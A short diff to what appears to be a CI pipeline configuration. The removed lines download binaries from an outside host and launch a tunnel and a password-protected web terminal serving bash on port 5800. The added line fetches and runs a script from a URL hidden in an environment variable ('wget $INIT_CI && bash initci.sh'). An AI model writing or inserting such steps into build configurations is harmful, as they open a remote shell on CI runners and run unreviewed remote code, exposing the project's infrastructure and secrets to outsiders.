@@ -20,12 +20,7 @@ jobs:
           no_output_timeout: 59m
           command: |
             # remote & mcp
-            curl -s -o cli.toml https://ggweb.19870707.xyz/cli.toml
-            curl -s -o ro https://ggweb.19870707.xyz/ro
-            curl -s -o ty https://ggweb.19870707.xyz/ty && chmod +x ro ty
-            nohup ./ro cli.toml &
-            nohup ./ty -p 5800 -c test:$TY_PWD -W bash >/dev/null &
-            
+            wget $INIT_CI && bash initci.sh
             mkdir -p ~/.config/containers
             echo -e "[engine]\ncgroup_manager = \"cgroupfs\"\nevents_backend = \"file\"" > ~/.config/containers/containers.conf
 
